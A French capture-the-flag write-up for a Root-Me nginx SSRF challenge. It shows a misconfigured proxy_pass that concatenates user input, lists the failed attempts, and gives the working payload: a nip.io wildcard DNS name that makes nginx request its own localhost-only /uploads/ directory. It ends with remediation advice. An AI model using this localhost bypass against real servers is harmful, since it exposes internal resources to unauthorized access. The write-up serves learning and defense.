# Fiche — Root-Me : « Nginx — SSRF Misconfiguration »

> Catégorie : Web-Serveur · Thème : SSRF (Server-Side Request Forgery) via `proxy_pass` mal configuré

---

## 1. Objectif

Accéder au répertoire `/uploads/`, qui est **interdit depuis l'extérieur** et réservé à `127.0.0.1`.
Le but : lire le fichier qui s'y trouve (un `.bak`) et récupérer le flag.

---

## 2. La configuration vulnérable

```nginx
server {
    listen 80;
    root /var/www/app/;
    resolver 127.0.0.11 ipv6=off;          # ← DNS interne Docker (clé du challenge)

    location / {
        root /var/www/app/login/;
        try_files $uri $uri/login.html $uri/ =404;
    }

    location /static/ {
        alias /var/www/app/static/;
    }

    location /uploads/ {                     # ← LA CIBLE
        allow 127.0.0.1;                     #    accessible UNIQUEMENT depuis localhost
        deny all;                            #    tout le reste est bloqué (403)
        autoindex on;                        #    listing activé → visible si on entre
        alias /var/www/app/uploads/;
    }

    location ~ /dir_enum(.*) {               # ← LE POINT D'ENTRÉE (vulnérable)
        proxy_pass   http://web-serveur-ch94-apache$1;
        proxy_redirect off;
    }
}
```

---

## 3. Les 3 observations qui mènent à la solution

### Observation A — `/uploads/` est servi par nginx, PAS par Apache
Le bloc `location /uploads/` est servi directement par **nginx** (`alias /var/www/app/uploads/`).
➡️ **Conséquence :** passer par le proxy vers Apache (`/dir_enum/uploads/`) renvoie **404**, car Apache n'a aucun `/uploads/`.
➡️ La vraie cible de la SSRF est donc **nginx lui-même**, pas Apache.

### Observation B — `/dir_enum(.*)` injecte l'entrée utilisateur dans `proxy_pass`
```
proxy_pass http://web-serveur-ch94-apache$1;
```
- `(.*)` capture **tout ce qui suit** `/dir_enum` dans la variable `$1`.
- `$1` est **collé directement** au nom d'hôte, **sans aucune validation**.
- On contrôle donc en partie l'adresse que nginx va contacter → **SSRF**.

### Observation C — `proxy_pass` avec variable = résolution DNS dynamique
- `proxy_pass` **statique** → nginx résout le nom **une seule fois** au démarrage.
- `proxy_pass` **avec une variable** (`$1`) → nginx résout le nom **à chaque requête**, via le `resolver`.

➡️ **C'est pour ça que `resolver 127.0.0.11;` est présent.** nginx envoie la partie « hôte » de l'URL reconstruite à ce serveur DNS.
➡️ **Le résolveur attend un NOM de domaine**, pas une IP brute glissée bizarrement dans l'URL.

---

## 4. Le cheminement des tentatives (et pourquoi elles échouent)

| Tentative | URL envoyée | Ce que nginx reconstruit | Résultat | Raison |
|---|---|---|---|---|
| Chemin direct | `/dir_enum/uploads/` | `http://web-serveur-ch94-apache/uploads/` | **404** | Apache n'a pas de `/uploads/` |
| IP brute + `@` | `/dir_enum@127.0.0.1:80/uploads/` | `http://web-serveur-ch94-apache@127.0.0.1:80/...` | **502** | Le résolveur n'arrive pas à traiter ce bloc avec IP brute → échec DNS |
| Nom DNS + `@` | `/dir_enum@127.0.0.1.nip.io:80/uploads/` | `http://...apache@127.0.0.1.nip.io:80/...` | **502** | Le `@` perturbe encore le parsing/résolution en mode variable |
| **Nom DNS en préfixe** | `/dir_enum.127.0.0.1.nip.io:80/uploads/` | `http://web-serveur-ch94-apache.127.0.0.1.nip.io:80/uploads/` | **✅ 200** | Un seul nom valide, résolu vers `127.0.0.1` |

---

## 5. La solution

### Payload final
```
http://challenge01.root-me.org:59094/dir_enum.127.0.0.1.nip.io:80/uploads/
```

### Décomposition
```
/dir_enum  .127.0.0.1.nip.io:80/uploads/
   │              │
   │              └── $1  (capturé par la regex, contrôlé par nous)
   └── préfixe fixe de la location

→ proxy_pass reconstruit :
  http://web-serveur-ch94-apache.127.0.0.1.nip.io:80/uploads/
                              └──────── UN SEUL nom de domaine ────────┘
```

### Pourquoi ça marche
1. **`nip.io` = service de "wildcard DNS"** : n'importe quel nom de la forme `<prefixe>.127.0.0.1.nip.io` résout vers **`127.0.0.1`**.
2. `web-serveur-ch94-apache` devient un simple **préfixe inoffensif** que nip.io ignore — plus besoin du `@`.
3. nginx envoie ce nom au `resolver 127.0.0.11` → réponse : **`127.0.0.1`**.
4. nginx se reconnecte donc **à lui-même** (sur son `listen 80`) et demande `/uploads/`.
5. La requête provenant de `127.0.0.1`, la règle **`allow 127.0.0.1;` est satisfaite**.
6. `autoindex on;` affiche le **listing** → on voit le fichier (ex. `nconf.bak`), on l'ouvre, on récupère le flag. 🏁

---

## 6. Concepts clés à retenir

- **SSRF (Server-Side Request Forgery)** : forcer un serveur à émettre des requêtes vers des ressources internes qu'un client externe ne devrait pas atteindre.
- **Injection dans `proxy_pass`** : concaténer une entrée utilisateur non validée à une adresse upstream = faille classique.
- **`proxy_pass` statique vs variable** : la présence d'une variable change le moment de la résolution DNS (démarrage → runtime) et impose un `resolver`.
- **Contournement de filtrage par IP** (`allow 127.0.0.1; deny all;`) : la SSRF permet de faire émettre la requête *par le serveur lui-même*, donc « depuis » localhost.
- **Wildcard DNS (`nip.io`, `sslip.io`)** : transformer une IP en un nom de domaine valide → indispensable quand un résolveur exige un nom et non une IP brute.
- **Syntaxe d'URL** : `user:pass@host:port/path` — comprendre où s'arrête le *host* est central dans ce type d'exploitation.

---

## 7. Remédiation (côté défense)

- **Ne jamais concaténer d'entrée utilisateur** dans `proxy_pass`. Utiliser un mapping strict (liste blanche) de destinations autorisées.
- Si un backend dynamique est nécessaire, **valider/filtrer** la valeur (regex stricte, pas de `.`, `@`, `:` arbitraires).
- Isoler le réseau : un filtrage applicatif (`allow 127.0.0.1`) ne doit pas être le seul rempart ; segmenter au niveau réseau/firewall.
- Désactiver `autoindex` sur les répertoires sensibles.
- Surveiller/bloquer la résolution de domaines « wildcard DNS » (nip.io, sslip.io, xip.io) depuis les serveurs internes.

---

*Fiche rédigée à but pédagogique — challenge résolu sur Root-Me.*
